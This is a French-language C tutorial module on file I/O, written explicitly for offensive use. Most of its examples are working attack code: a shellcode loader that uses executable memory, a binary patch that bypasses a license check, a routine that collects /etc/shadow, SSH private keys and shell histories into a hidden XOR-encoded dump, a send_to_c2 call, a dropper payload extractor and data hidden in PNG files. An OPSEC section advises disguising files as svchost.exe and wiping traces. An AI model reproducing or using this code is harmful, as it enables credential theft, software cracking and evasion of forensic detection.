# Module 14 - File I/O : Lire, Écrire, Exfiltrer

## Pourquoi tu dois maîtriser ça

```c
// Charger un shellcode depuis disque
unsigned char* sc = read_file("payload.bin", &size);
void (*exec)(void) = (void(*)(void))sc;
exec();

// Patcher un binaire (bypass license check)
FILE* fp = fopen("target.exe", "r+b");
fseek(fp, 0x1234, SEEK_SET);
fwrite("\x90\x90", 1, 2, fp);  // JNE → NOP NOP
fclose(fp);

// Exfiltrer /etc/passwd
char* data = read_file("/etc/passwd", &size);
send_to_c2(data, size);
```

**File I/O = charger des payloads, exfiltrer des données, patcher des binaires.**

---

## fopen/fclose : Base obligatoire

```c
FILE* fp = fopen("fichier.txt", "r");
if (!fp) {
    perror("fopen");  // Affiche l'erreur
    return -1;
}
// ... utilisation ...
fclose(fp);  // TOUJOURS fermer
```

> **FILE\*** = pointeur opaque vers une structure fichier. **perror()** affiche le message d'erreur système.

### Modes d'ouverture

| Mode | Action | Si n'existe pas |
|------|--------|-----------------|
| `"r"` | Lecture | Erreur |
| `"w"` | Écriture (écrase) | Crée |
| `"a"` | Append (fin) | Crée |
| `"r+"` | Lecture + écriture | Erreur |
| `"w+"` | Lecture + écriture | Crée (écrase) |
| `"r+b"` | Binaire read/write | **Pour patching** |

> Ajoute `b` pour le mode **binaire** (`"rb"`, `"wb"`, `"r+b"`). Obligatoire pour payloads/shellcode.

---

## Lire des fichiers

### fread() : Lecture binaire (payloads)

```c
unsigned char buffer[1024];
size_t bytes_read = fread(buffer, 1, sizeof(buffer), fp);
//                        │       │  │              │
//                        dest    │  max bytes      source
//                           element size
```

### fgets() : Lecture ligne par ligne (logs/config)

```c
char line[256];
while (fgets(line, sizeof(line), fp)) {
    if (strstr(line, "password")) {
        printf("[+] Found: %s", line);
    }
}
```

### Lire un fichier entier (pattern crucial)

```c
unsigned char* read_file(const char* path, long* size) {
    FILE* fp = fopen(path, "rb");
    if (!fp) return NULL;

    fseek(fp, 0, SEEK_END);
    *size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    unsigned char* buf = malloc(*size);
    fread(buf, 1, *size, fp);
    fclose(fp);

    return buf;  // Appelant doit free()
}

// Usage
long size;
unsigned char* shellcode = read_file("payload.bin", &size);
```

---

## Écrire des fichiers

### fwrite() : Écriture binaire

```c
unsigned char data[] = {0x48, 0x31, 0xC0, 0xC3};
FILE* fp = fopen("shellcode.bin", "wb");
fwrite(data, 1, sizeof(data), fp);
fclose(fp);
```

### fprintf() : Écriture formatée

```c
FILE* fp = fopen("/tmp/.exfil.txt", "w");
fprintf(fp, "User: %s\n", getenv("USER"));
fprintf(fp, "Home: %s\n", getenv("HOME"));
fclose(fp);
```

---

## Navigation : fseek/ftell

> **fseek()** déplace le curseur, **ftell()** retourne la position actuelle.

```c
fseek(fp, offset, whence);
//       │       │
//       │       └── SEEK_SET (début), SEEK_CUR (actuel), SEEK_END (fin)
//       └── Nombre de bytes (peut être négatif)
```

### Obtenir la taille d'un fichier

```c
fseek(fp, 0, SEEK_END);
long size = ftell(fp);
fseek(fp, 0, SEEK_SET);  // Retour au début
```

### Lire à un offset spécifique

```c
// Lire le header PE (offset 0x3C contient l'offset du PE header)
fseek(fp, 0x3C, SEEK_SET);
unsigned int pe_offset;
fread(&pe_offset, 4, 1, fp);

fseek(fp, pe_offset, SEEK_SET);
// Maintenant on est au PE header
```

---

## Applications offensives

### 1. Charger et exécuter un shellcode

```c
void load_and_exec(const char* path) {
    long size;
    unsigned char* code = read_file(path, &size);
    if (!code) return;

    // Allouer mémoire exécutable (VirtualAlloc sur Windows)
    void* exec_mem = mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC,
                          MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(exec_mem, code, size);
    free(code);

    ((void(*)(void))exec_mem)();
}
```

### 2. Patcher un binaire (bypass check)

```c
int patch_binary(const char* path, long offset, unsigned char* patch, int len) {
    FILE* fp = fopen(path, "r+b");  // Read+Write binary
    if (!fp) return -1;

    fseek(fp, offset, SEEK_SET);
    fwrite(patch, 1, len, fp);

    fclose(fp);
    return 0;
}

// Usage : remplacer JNE (0x75) par JMP (0xEB) à l'offset 0x1234
unsigned char jmp = 0xEB;
patch_binary("target.exe", 0x1234, &jmp, 1);
```

### 3. Exfiltration de fichiers sensibles

```c
void exfil_config(void) {
    char* targets[] = {
        "/etc/passwd",
        "/etc/shadow",       // Besoin root
        "/home/*/.ssh/id_rsa",
        "/home/*/.bash_history",
        NULL
    };

    FILE* out = fopen("/tmp/.dump.enc", "wb");

    for (int i = 0; targets[i]; i++) {
        long size;
        unsigned char* data = read_file(targets[i], &size);
        if (data) {
            // XOR avant écriture
            for (long j = 0; j < size; j++) data[j] ^= 0x42;
            fwrite(data, 1, size, out);
            free(data);
        }
    }
    fclose(out);
}
```

### 4. Extraction de payload depuis un dropper

```c
// Le dropper contient un marker suivi du payload
#define MARKER "\xDE\xAD\xBE\xEF"

unsigned char* extract_payload(const char* dropper, long* payload_size) {
    long file_size;
    unsigned char* data = read_file(dropper, &file_size);
    if (!data) return NULL;

    // Chercher le marker
    for (long i = 0; i < file_size - 4; i++) {
        if (memcmp(data + i, MARKER, 4) == 0) {
            // Payload commence après le marker
            *payload_size = file_size - i - 4;
            unsigned char* payload = malloc(*payload_size);
            memcpy(payload, data + i + 4, *payload_size);
            free(data);
            return payload;
        }
    }

    free(data);
    return NULL;
}
```

### 5. Parsing de logs (recon)

```c
void scan_auth_logs(void) {
    FILE* fp = fopen("/var/log/auth.log", "r");
    if (!fp) return;

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "Accepted password") ||
            strstr(line, "sudo:")) {
            printf("[+] %s", line);
        }
    }
    fclose(fp);
}
```

### 6. Steganographie basique (append après EOF)

```c
// Cacher des données après la fin d'un PNG
void hide_in_png(const char* png_path, unsigned char* data, int len) {
    FILE* fp = fopen(png_path, "ab");  // Append binary
    fwrite("\x00\x00\x00\x00HIDE", 1, 8, fp);  // Marker
    fwrite(data, 1, len, fp);
    fclose(fp);
}

// Extraire
unsigned char* extract_from_png(const char* png_path, int* len) {
    long size;
    unsigned char* file = read_file(png_path, &size);

    // Chercher marker "HIDE"
    for (long i = 0; i < size - 4; i++) {
        if (memcmp(file + i, "HIDE", 4) == 0) {
            *len = size - i - 4;
            unsigned char* hidden = malloc(*len);
            memcpy(hidden, file + i + 4, *len);
            free(file);
            return hidden;
        }
    }
    free(file);
    return NULL;
}
```

---

## OPSEC : Erreurs à éviter

| ❌ Dangereux | ✅ Safe |
|-------------|---------|
| Fichiers avec noms suspects (`malware.exe`) | Noms génériques (`svchost.exe`, `update.dat`) |
| Écrire dans `/home/user/` | Écrire dans `/tmp/`, `/var/tmp/` |
| Laisser les fichiers après usage | `remove()` après utilisation |
| Permissions par défaut | `chmod()` pour restreindre |

```c
// Supprimer ses traces
remove("/tmp/.payload.bin");

// Ou écraser avant suppression (anti-forensic)
void secure_delete(const char* path) {
    long size;
    read_file(path, &size);

    FILE* fp = fopen(path, "wb");
    for (long i = 0; i < size; i++) fputc(0x00, fp);
    fclose(fp);
    remove(path);
}
```

---

## Fichier texte vs binaire

| Aspect | Texte (`"r"`, `"w"`) | Binaire (`"rb"`, `"wb"`) |
|--------|---------------------|--------------------------|
| Newlines | Convertis (`\r\n` → `\n`) | Préservés |
| Usage | Config, logs | Shellcode, EXE, PE |
| Fonctions | `fgets`, `fprintf` | `fread`, `fwrite` |

**Règle : Toujours `"rb"`/`"wb"` pour des payloads.**

---

## Pièges courants

### Oublier de fermer

```c
FILE* fp = fopen("file.txt", "r");
// ... erreur quelque part, return sans fclose
// → File descriptor leak, max files ouverts atteint
```

**Solution : pattern goto cleanup**

```c
int process_file(const char* path) {
    FILE* fp = NULL;
    char* buf = NULL;
    int ret = -1;

    fp = fopen(path, "rb");
    if (!fp) goto cleanup;

    buf = malloc(1024);
    if (!buf) goto cleanup;

    // ... traitement ...
    ret = 0;

cleanup:
    if (buf) free(buf);
    if (fp) fclose(fp);
    return ret;
}
```

### Buffer trop petit pour fgets

```c
char buf[10];
fgets(buf, 100, fp);  // ❌ Buffer overflow !
fgets(buf, sizeof(buf), fp);  // ✅
```

---

## Exercices pratiques

### Exo 1 : read_file helper (5 min)
Implémente la fonction `read_file()` complète avec gestion d'erreurs.

### Exo 2 : Binary patcher (10 min)
Crée un outil qui remplace `0x75` (JNE) par `0xEB` (JMP) à un offset donné.

### Exo 3 : Log scanner (10 min)
Parse `/var/log/auth.log` et extrait les tentatives de connexion échouées.

### Exo 4 : Payload extractor (15 min)
Extrait un payload caché dans un fichier après un marker `0xDEADBEEF`.

---

## Checklist

```
□ Je sais utiliser fopen/fclose avec gestion d'erreurs
□ Je comprends les modes "r", "w", "a", "rb", "r+b"
□ Je sais lire un fichier entier (fseek + ftell + fread)
□ Je sais patcher un binaire à un offset donné
□ Je sais naviguer avec fseek (SEEK_SET, SEEK_CUR, SEEK_END)
□ Je comprends la différence texte vs binaire
□ Je sais cacher/extraire des données (steganographie)
```

---

## Glossaire express

| Terme | Définition |
|-------|------------|
| **FILE\*** | Pointeur vers structure fichier (opaque) |
| **fseek** | Déplace le curseur de lecture/écriture |
| **ftell** | Retourne la position actuelle |
| **SEEK_SET/CUR/END** | Référence pour fseek (début/actuel/fin) |
| **Steganographie** | Cacher des données dans un fichier légitime |
| **Dropper** | Exécutable qui contient et extrait un payload |

---

## Prochaine étape

**Module suivant →** [15 - Preprocessor](../15_preprocessor/)

---

**Temps lecture :** 8 min | **Pratique :** 30 min
